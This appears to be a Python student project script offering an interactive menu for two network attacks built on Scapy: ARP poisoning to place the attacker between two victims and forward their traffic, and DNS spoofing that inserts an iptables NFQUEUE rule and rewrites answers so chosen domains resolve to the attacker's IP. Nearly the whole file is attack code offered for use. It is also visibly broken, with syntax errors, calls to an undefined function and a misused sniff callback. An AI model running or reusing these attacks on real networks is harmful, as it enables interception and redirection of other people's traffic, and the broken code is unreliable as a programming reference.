
# MITM ARP spoofing attack - using Scapy

# Imports
from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import logging as log
from scapy.all import IP, DNSRR, DNS, UDP, DNSQR

# The main method to be ran by the user of our script
def main():
       typeOfAttack = int(input("Choose your attack. \nType 1 for a MITM ARP poisoning attack.\nType 2 for a DNS spoofing attack.\nType of attack: "))
       if (typeOfAttack == 1):
           arp_poison()
       elif (typeOfAttack == 2):
           dns_spoof()
       else:
           print("No or wrong input.")

def arp_poison():
    # The user is given the option to choose how many hosts will be attacked during the ARP poisoning attack.
    nrOfHosts = int(input("The number of hosts you want to ARP poison: "))

    # If number of hosts is less than 2, a while loop is instantiated which can only be left if the number of hosts becomes greater or equal than 2
    if (nrOfHosts < 2):
        print("A MITM ARP poisoning attack with less than 2 hosts is not possible.")
        print("The number of hosts you want to ARP poison: ")
        while (nrOfHosts < 2):
            nrOfHosts = input()

    macVictimList = []
    ipVictimList = []

    # The MAC and IP addresses of the victims and the attacker are obtained
    # victims must be separated into two groups, servers and hosts
    for i in range(nrOfHosts): 
        # Note: i + 1 is printed to the user of the software
        macVictimList.append(raw_input("The MAC address of the " + str(i+1) + "th victim:"))
        ipVictimList.append(raw_input("The IP address of the " + str(i+1) + "th victim:"))
    macAttacker = raw_input("The MAC address of the attacker: ")
    # ipAttacker = input("The IP address of the attacker: ")

    #for (i in nrOfHosts):
    #    arp
    
    if (nrOfHosts == 2):
        # Send ARP package to victim 1 of spoofed IP victim 2
        arp1 = Ether() / ARP()
        arp1[Ether].src = macAttacker
        arp1[ARP].hwsrc = macAttacker
        arp1[ARP].psrc = ipVictimList[1]
        arp1[ARP].hwdst = macVictimList[0]
        arp1[ARP].pdst = ipVictimList[0]
        sendp(arp1, iface="enp0s3")

        # Send ARP package to victim 2 of spoofed IP victim 1
        arp2 = Ether() / ARP()
        arp2[Ether].src = macAttacker
        arp2[ARP].hwsrc = macAttacker
        arp2[ARP].psrc = ipVictimList[0]
        arp2[ARP].hwdst = macVictimList[1]
        arp2[ARP].pdst = ipVictimList[1]
        sendp(arp2, iface="enp0s3")
        
        # Call sniff to start sniffing for incoming packets from victims, and resend packets received via forward_packet
        sniff(prn=forward_packet(packet, macVictimList, ipVictimList, macAttacker), iface = "enp0s3")

        # A infinite loop is used to send ARP packages continuously updating the ARP tables of the victims
        while(True):
            # Send ARP package to victim 1 of spoofed IP victim 2
            sendp(arp1, iface="enp0s3")

            # Send ARP package to victim 2 of spoofed IP victim 1
            sendp(arp2, iface="enp0s3")

            # Timer
            time.sleep(3)

    
# This method is used to forward the received packet we sniffed to the host it was intended to be sent to
def forward_packet(packet, macVictimList, ipVictimList, macAttacker):
    for i in len(arppoison().ipVictimList):
        if (packet[ARP].pdst == arppoison().ipVictimList[i] and packet[Ether].dst == macAttacker):
            # Once we have the IP address of the destination, we must change the MAC address to what it should have been if it was not spoofed
            packet[Ether].dst = arppoison().macVictimList[i]
            # We also change the source MAC address to the attacker's MAC address so we can listen in on the response
            packet[Ether].src = macAttacker
            # Resend the packet to it's rightful destination
            sendp(packet)

            # Let the attacker know who sent a packet to whom
            print("A packet from " + str(packet[ARP].psrc) + " has been redirected to " + str(packet[ARP].pdst))

            # If a match has been found we break out of the loop as only one match can be found
            break

# To Do before you are able to run this method succesfully
#
# In terminal:
# From: https://github.com/oremanj/python-netfilterqueue/issues/67

# apt-get install build-essential python-dev libnetfilter-queue-dev
# git clone git@github.com:kti/python-netfilterqueue.git
# cd python-netfilterqueue
# sudo apt-get install python3-dev
# python setup.py install

# pip3 install scapy
# pip3 install netfilterqueue 
def dns_spoof():
    # The user needs to input the ipVictim
    ipVictim = raw_input("The IP address of the victim: "))

    # The user needs to input the ipAttacker
    ipAttacker = raw_input("The IP address of the attacker: "))

    # The user needs to input the ipGatewayRouter
    ipGatewayRouter = raw_input("The IP address of the gateway router: "))

    class DnsSnoof:
        def __init__(self, dns_hosts, queueNum):
            self.dns_hosts = dns_hosts
            self.queueNum = queueNum
            self.queue = NetfilterQueue()
  
        def __call__(self):
            log.info("Snoofing....")
            os.system(
                f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
            self.queue.bind(self.queueNum, self.callBack)
            try:
                self.queue.run()
            except KeyboardInterrupt:
                os.system(
                    f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
                log.info("[!] iptable rule flushed")
  
        def callBack(self, packet):
            scapyPacket = IP(packet.get_payload())
            if scapyPacket.haslayer(DNSRR):
                try:
                    log.info(f'[original] { scapyPacket[DNSRR].summary()}')
                    queryName = scapyPacket[DNSQR].qname
                    if queryName in self.dns_hosts:
                        scapyPacket[DNS].an = DNSRR(
                            rrname=queryName, rdata=self.dns_hosts[queryName])
                        scapyPacket[DNS].ancount = 1
                        del scapyPacket[IP].len
                        del scapyPacket[IP].chksum
                        del scapyPacket[UDP].len
                        del scapyPacket[UDP].chksum
                        log.info(f'[modified] {scapyPacket[DNSRR].summary()}')
                    else:
                        log.info(f'[not modified] { scapyPacket[DNSRR].rdata }')
                except IndexError as error:
                    log.error(error)
                packet.set_payload(bytes(scapyPacket))
            return packet.accept()
  
  
    if __name__ == '__main__':
        try:
            #the hosts that we try to spoof
            dns_hosts = {
                b"tue.com.": ipAttacker,
                b"site.com.": ipAttacker
            }
            queueNum = 1
            log.basicConfig(format='%(asctime)s - %(message)s', 
                            level = log.INFO)
            snoof = DnsSnoof(dns_hosts, queueNum)
            snoof()
        except OSError as error:
            log.error(error)

main()